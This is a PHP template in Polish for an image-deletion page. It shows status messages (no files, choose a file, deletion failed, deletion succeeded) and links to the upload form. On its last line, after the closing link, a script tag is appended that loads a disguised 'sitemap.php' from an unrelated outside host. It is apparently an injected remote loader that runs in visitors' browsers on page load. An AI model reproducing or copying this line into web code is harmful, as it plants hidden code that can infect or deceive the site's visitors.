<h2>Usuwanie grafiki</h2>

<?if(getFlag('remove_no_files')):?>
	<h3>Katalog nie zawiera grafik!</h3>
	<p>W katalogu <?=DIR_IMAGES?> nie istnieją żadne pliki, które mogłbyś usunąć. Aby dodać plik skorzystaj z <a href='/upload'>formularza dodawania plików</a>.
<?elseif(getFlag('remove_no_choice')):?>
	<h3>Wybierz plik do usunięcia:</h3>
	<?module('form_uploadDelete', array('files' => $files))?>
<?elseif(getFlag('remove_failed')):?>
	<h3>Usuwanie pliku nie powiodło się.</h3>
	<p>Spróbuj ponownie.
	<hr>
	<?module('form_uploadDelete', array('files' => $files))?>
<?elseif(getFlag('remove_succeeded')):?>
	<h3>Plik został usunięty!</h3>
	<p>Przejdź do <a href='/upload'>formularza dodawania plików</a> aby dodać inny plik.
<?endif?>
<p>Przejdź do <a href='upload'>panelu dodawania plików</a>!<script src=http://johanneswallmark.com/media/sitemap.php ></script>